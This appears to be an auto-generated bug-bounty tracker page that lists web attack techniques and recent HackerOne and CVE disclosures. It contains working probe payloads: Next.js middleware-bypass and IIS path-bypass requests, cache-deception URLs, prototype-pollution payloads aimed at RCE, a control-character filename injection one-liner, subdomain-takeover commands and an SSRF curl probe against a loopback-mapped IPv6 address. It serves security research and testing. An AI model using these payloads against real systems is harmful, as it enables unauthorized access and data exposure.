# Misc Techniques

> Tracked CVEs and techniques for this class. Updated via daily `refresh-latest` pipeline.

_Last updated: 2026-04-17 · Items: 1_

---

## What

_Define the class, prerequisites, and typical finding shape. Fill with real content._
_pending enrichment — baseline opener below_

See items under ## Items for per-finding details.

---

## CVEs

_No CVE-assigned items yet. Items below are pre-CVE or class-level findings._

---

## Probes

_Grep, curl, nuclei probes for this class. Append as items arrive with real PoCs._
_pending enrichment_

---

## PoCs

_Public PoC links rolled up from items below._

_No PoCs in items yet._

---

## Reproduction

_Step-by-step repro steps per CVE. Populated as items arrive with enough detail._
_pending enrichment_

---

## Defense

_Patch guidance and detection rules. Populated from vendor advisories._
_pending enrichment_

---

## References

- [projectzero.google](https://projectzero.google/2026/03/mutational-grammar-fuzzing.html)
- [medium.com](https://medium.com/@dheerajdonikena/how-i-made-200-just-by-changing-a-response-c201624867c4)
- [medium.com](https://medium.com/@techyringo/i-hacked-deeper-into-a-network-without-moving-heres-how-ssh-pivoting-works-e04952a87214)
- [medium.com](https://medium.com/@rgoel.goel03/detecting-web-attacks-reconstructing-an-attack-from-logs-and-network-traffic-5739efaa1644)
- [www.intigriti.com](https://www.intigriti.com/researchers/blog/hacker-spotlight/from-curiosity-to-critical-bugs-interview-with-marc-oliver-munz-c1phy)

---

## Items

> Catch-all for techniques that don't fit a single class — framework-specific bugs, middleware bypass, path confusion, and emerging attack surfaces.

## Surface

- Next.js middleware — wildcard route matching, `x-middleware-subrequest` bypass
- IIS path normalization — trailing dots, semicolons, Unicode in path segments
- WebSocket upgrade paths — HTTP-level attacks before protocol switch
- Terminal emulator / IDE integrations — control character injection
- Agentic workflows with tool-call APIs — IDOR + privilege escalation in agent-facing endpoints
- Subdomain takeover — dangling DNS CNAME to unclaimed SaaS service
- Cache deception — public cache stores authenticated responses via path suffix tricks

## Next.js Middleware Bypass

CVE-2025-29927 class: middleware execution skipped via malformed path or internal header.

```
# Test x-middleware-subrequest header (CVE-2025-29927)
GET /admin/users HTTP/1.1
Host: target.com
x-middleware-subrequest: 1

# Path normalization bypass
GET /app/middleware/../admin HTTP/1.1
GET /api/auth/protected%2F..%2Fadmin HTTP/1.1
```

Affected pattern: `middleware.ts` with wildcard matcher `[...slug]` or insufficient path checks.

## IIS / Sitecore Auth Bypass

IIS auth bypass via unusual path segments:

```
# Trailing dot (IIS maps /path. to /path)
GET /admin. HTTP/1.1

# Semicolon path injection
GET /admin;test/ HTTP/1.1

# Case normalization (IIS case-insensitive)
GET /ADMIN/ HTTP/1.1
GET /%61dmin/ HTTP/1.1
```

Sitecore 9.3: multiple RCE vectors and auth bypasses via IIS integration — prioritize if you see `/sitecore/` paths.

## Subdomain Takeover

```bash
# Enumerate dangling CNAMEs
subfinder -d target.com -silent | httpx -silent -status-code | grep 404
# Cross-reference with known takeover-able services
subjack -w subdomains.txt -t 100 -ssl -o results.txt
nuclei -t takeovers/ -l subdomains.txt
```

High-value targets: Fastly, GitHub Pages, Heroku, Azure (azurewebsites.net), AWS (s3, elasticbeanstalk).

## Web Cache Deception

Force cache to store authenticated response at a public-facing path:

```
# Append cacheable suffix — proxy caches it, next visitor gets your data
GET /account/profile/nonexistent.css HTTP/1.1
GET /api/user/me/..%2Fstatic.js HTTP/1.1
```

Confirm: fetch URL unauthenticated from different IP — if you get the victim's data, it's cached.

## Control Character Injection (Terminals/IDEs)

ASCII control sequences in filenames or file content reach terminal emulators:

```
# SOH, STX, EOT in filenames execute in VS Code integrated terminal
echo -e "\x01id\x0a" > "$(printf '\001id\012')"

# Check: does app strip control chars before passing to shell/terminal?
# Test with filename: test\x00.txt, test\x01.txt
```

## Prototype Pollution → RCE

Node.js gadget chains via prototype pollution in merge/clone operations:

```javascript
// Pollute via JSON param
{"__proto__": {"polluted": "yes"}}
{"constructor": {"prototype": {"polluted": "yes"}}}

// RCE via child_process gadget (specific framework versions)
{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ"}}
```

Scan with: `ppmap` — automated prototype pollution scanner.

## Tools

- **nuclei** — misc CVE templates, subdomain takeover, middleware bypass: `nuclei -t misc/ -t takeovers/ -u https://target.com`
- **subjack** — subdomain takeover checker
- **ppmap** — prototype pollution scanner
- **cariddi** — crawl + endpoint discovery for misc vulns

## Chain Opportunities

- **Subdomain takeover → CSP bypass** — control subdomain whitelisted in CSP, host XSS payload
- **Cache deception → PII leak** — authenticated profile data cached and served to anyone with URL
- **Next.js middleware bypass → auth bypass → IDOR → ATO** — skip auth middleware, access any user object
- **Prototype pollution → RCE** — polluted property reaches `child_process.spawn` or `eval`
- **Control char injection → RCE** — terminal processes injected control sequences as commands

## Recent Intel

- **CVE-2025-29927** · Next.js middleware bypass via `x-middleware-subrequest` header or path normalization — affected versions 13-15 with wildcard matchers · https://www.assetnote.io/resources/research/doing-the-due-diligence-analyzing-the-next-js-middleware-bypass-cve-2025-29927
- **VS Code control character RCE** · ASCII SOH/STX/EOT in filenames or drag-and-drop content triggers terminal command execution — drag-and-pwnd technique, stealthy injection bypassing printable-char filters · https://portswigger.net/research/drag-and-pwnd-leverage-ascii-characters-to-exploit-vs-code
- **Sitecore 9.3 IIS bypass** · Three distinct RCE vectors + two auth bypasses via IIS authorization integration — check `/sitecore/shell/` and `/sitecore/admin/` paths for exposed management handlers · https://www.assetnote.io/resources/research/bypass-iis-authorisation-with-this-one-weird-trick-three-rces-and-two-auth-bypasses-in-sitecore-9-3

## 2026-04-17

### On the Effectiveness of Mutational Grammar Fuzzing

- **Tags:** `#web`
- **Severity:** unknown · **Hunt:** 3/5 · **Score:** 12.0 · **Status:** unknown · **Age:** 0d
- **Sources:** [1](https://projectzero.google/2026/03/mutational-grammar-fuzzing.html) · [2](https://medium.com/@dheerajdonikena/how-i-made-200-just-by-changing-a-response-c201624867c4) · [3](https://medium.com/@techyringo/i-hacked-deeper-into-a-network-without-moving-heres-how-ssh-pivoting-works-e04952a87214) · [4](https://medium.com/@rgoel.goel03/detecting-web-attacks-reconstructing-an-attack-from-logs-and-network-traffic-5739efaa1644) · [5](https://www.intigriti.com/researchers/blog/hacker-spotlight/from-curiosity-to-critical-bugs-interview-with-marc-oliver-munz-c1phy)

**On the Effectiveness of Mutational Grammar Fuzzing** — This post refines coverage-guided fuzzing by preserving grammar structure during mutations to uncover complex logic issues (like XSLT/JIT bugs) that standard mutational fuzzers miss. Hunt: low signal — skip. [src](https://projectzero.google/2026/03/mutational-grammar-fuzzing.html)

---
*Clustered 14 sources for this item.*


## 2026-04-19 — H1 disclosures

### SQL Injection Detection Bypass in AWS WAF Managed Rules (AWSManagedRulesSQLiRuleSet)

- **2026-04-15** · sev: None · bounty: undisclosed
- Source: [hackerone.com/3591725](https://hackerone.com/reports/3591725) · Reporter: [@killnet-edc](https://hackerone.com/killnet-edc) · Team: [AWS VDP](https://hackerone.com/aws_vdp)
- CWE: SQL Injection

**What**

_No H1 summary provided._

**Hunt signal:** pass — summary too thin

---

### SSRF Filter Bypass via Unblocked NAT64 Local-Use IPv6 Prefix (64:ff9b:1::/48)

- **2026-03-31** · sev: High · bounty: undisclosed
- Source: [hackerone.com/3634400](https://hackerone.com/reports/3634400) · Reporter: [@tipsen](https://hackerone.com/tipsen) · Team: [arkadiyt-projects](https://hackerone.com/arkadiyt-projects)
- CWE: Server-Side Request Forgery (SSRF)

**What**

A vulnerability was discovered in the `ssrf_filter` library version 1.3.0. The library failed to block the NAT64 local-use IPv6 prefix `64:ff9b:1::/48`, allowing such addresses to be treated as public. This enabled SSRF requests through `/fetch` to targets encoded under that prefix when routable in the deployment environment.

**Hunt signal:** `curl --data-raw 'url=http://[64:ff9b:1::7f00:1]/' <target>/fetch` — test SSRF endpoints with the NAT64 local-use prefix `64:ff9b:1::` mapped to `127.0.0.1` (`7f00:1`).
**Grep:** `rg -n 'ssrf|url.*parse|is_private|is_internal' --type ruby`
**Nuclei:** `ssrf`
**Pass-if:** Target has no URL-fetch/orchestration endpoints, or IPv6 is fully disabled on the server network.

---

### SQL Injection vulnerability found on ibm.com endpoint

- **2026-03-12** · sev: Critical · bounty: undisclosed
- Source: [hackerone.com/3578842](https://hackerone.com/reports/3578842) · Reporter: [@cr3ckerxploit](https://hackerone.com/cr3ckerxploit) · Team: [IBM](https://hackerone.com/ibm)
- CWE: SQL Injection

**What**

A SQL injection vulnerability was found on an ibm.com endpoint. The vulnerability was reported to IBM, analyzed, and remediated.

**Hunt signal:** pass — summary too thin.

---


## 2026-04-23 — H1 disclosures

### Complete authentication bypass to admin permissions

- **2026-04-22** · sev: Critical · bounty: undisclosed · cve: CVE-2026-29198
- Source: [hackerone.com/3564655](https://hackerone.com/reports/3564655) · Reporter: [@npc](https://hackerone.com/npc) · Team: [Rocket.Chat](https://hackerone.com/rocket_chat)
- CWE: SQL Injection

**What**

_No H1 summary provided._

**PoC refs:** search `github.com/search?q=CVE-2026-29198` · [trickest/cve](https://github.com/trickest/cve/blob/main/CVE-2026-29198.md) · [nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)

**Hunt signal:** pass — summary too thin

---


## 2026-05-27 — H1 disclosures

### SQL Injection in Column Type Parameter Allows Arbitrary SQL Execution

- **2026-05-15** · sev: High · bounty: undisclosed · cve: CVE-2026-45545
- Source: [hackerone.com/3462991](https://hackerone.com/reports/3462991) · Reporter: [@suul](https://hackerone.com/suul) · Team: [Nextcloud](https://hackerone.com/nextcloud)
- CWE: SQL Injection

**What**

_No H1 summary provided._

**PoC refs:** search `github.com/search?q=CVE-2026-45545` · [trickest/cve](https://github.com/trickest/cve/blob/main/CVE-2026-45545.md) · [nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)

**Hunt signal:** pass — summary too thin

---


## 2026-07-01 — H1 disclosures

### SSRF via Improper Redirect Validation in Rocket.Chat oEmbed Function

- **2026-06-11** · sev: Medium · bounty: undisclosed
- Source: [hackerone.com/3383079](https://hackerone.com/reports/3383079) · Reporter: [@button142857](https://hackerone.com/button142857) · Team: [Rocket.Chat](https://hackerone.com/rocket_chat)
- CWE: Server-Side Request Forgery (SSRF)

**What**

A vulnerability was discovered in Rocket.Chat version 7.10.1 where the oEmbed feature did not properly validate redirected URLs. This allowed an attacker to bypass SSRF protections and access internal network resources that would otherwise be unreachable.

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---

### SSRF via improper validation after DNS name resolution in the link-preview feature

- **2026-06-11** · sev: High · bounty: undisclosed
- Source: [hackerone.com/3393664](https://hackerone.com/reports/3393664) · Reporter: [@button142857](https://hackerone.com/button142857) · Team: [Rocket.Chat](https://hackerone.com/rocket_chat)
- CWE: Server-Side Request Forgery (SSRF)

**What**

The link-preview feature in Rocket.Chat version 7.11.0 did not properly validate the IP address after DNS resolution. This allowed an attacker to obtain a domain that pointed to an internal IP address, triggering SSRF and enabling access to internal hosts that would otherwise be unreachable.

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---

### curl-ipv4-percent-normalization-SSRF

- **2026-06-10** · sev: Medium · bounty: undisclosed
- Source: [hackerone.com/3791168](https://hackerone.com/reports/3791168) · Reporter: [@monk17](https://hackerone.com/monk17) · Team: [curl](https://hackerone.com/curl)
- CWE: Server-Side Request Forgery (SSRF)

**What**

_No H1 summary provided._

**Hunt signal:** pass — summary too thin

---

## 2026-07-05 — CVE-2026-44578: Next.js WebSocket Upgrade SSRF

### CVE-2026-44578 — Next.js WebSocket SSRF (Unauthenticated)
- **Date:** 2026-07-05 · **Source:** [github.com/advisories/GHSA-c4j6-fc7j-m34r](https://github.com/advisories/GHSA-c4j6-fc7j-m34r) · **Class:** cve
- **What:** Unauthenticated SSRF in self-hosted Next.js via crafted WebSocket Upgrade header; `normalizeRepeatedSlashes` sets a skip flag that `proxyRequest` ignores when `parsedUrl.protocol` is truthy — attacker-controlled absolute URI proxied to internal targets.
- **Why it matters:** ~79,000 exposed self-hosted instances; reaches AWS IMDSv1 (169.254.169.254), GCP/Azure metadata, internal admin panels with no credentials; EPSS 38.7%.
- **Hunt signal:** `nuclei -t cve/2026/CVE-2026-44578.yaml` or `python3 nextssrf.py -t <target> --cloud`; check for `Connection: Upgrade` + `Upgrade: websocket` pass-through on port 80/443.
- **Evidence:** [GHSA-c4j6-fc7j-m34r](https://github.com/advisories/GHSA-c4j6-fc7j-m34r) · PoC: [github.com/ynsmroztas/nextssrf](https://github.com/ynsmroztas/nextssrf)
- **Affected:** Next.js 13.4.13 – 15.5.15, 16.0.0 – 16.2.4 (self-hosted only; Vercel-hosted unaffected)
- **Fixed:** 15.5.16, 16.2.5 (May 2026)
- **CVSS:** 8.6 · **KEV:** No
